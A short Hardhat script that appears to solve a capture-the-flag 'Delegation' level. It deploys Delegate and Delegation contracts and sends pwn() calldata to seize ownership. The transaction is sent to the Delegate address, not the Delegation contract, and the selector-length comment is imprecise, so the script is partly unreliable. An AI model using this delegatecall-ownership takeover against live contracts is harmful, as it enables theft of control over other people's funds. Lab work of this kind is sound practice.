import { ethers } from "hardhat";

async function main() {
  const signer = await ethers.provider.getSigner();
  const owner = signer.getAddress();

  const Delegate = await ethers.getContractFactory("Delegate");
  const delegateContract = await Delegate.deploy(owner);

  const Delegation = await ethers.getContractFactory("Delegation");
  const delegationContract = await Delegation.deploy(delegateContract.address);

  const delegateDeploymentTx = await delegateContract.deployed();
  const delegationDeploymentTx = await delegationContract.deployed();

  // Uncomment to check deployment TX
  // console.log(delegateDeploymentTx);
  // console.log(delegationDeploymentTx);

  const pwnData = await delegateContract.populateTransaction.pwn();
  // this is correct
  console.log("this is correct: ", pwnData.data);
  console.log(
    "this is incorrect, you only need the first 8 characters: ",
    await ethers.utils.keccak256(Buffer.from("pwn()"))
  );

  const attackTx = await signer.sendTransaction({
    from: owner,
    to: delegateContract.address,
    value: 0,
    gasLimit: 50000,
    data: pwnData.data,
  });

  // here you can see the transaction result insted of using etherscan
  console.log(attackTx);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
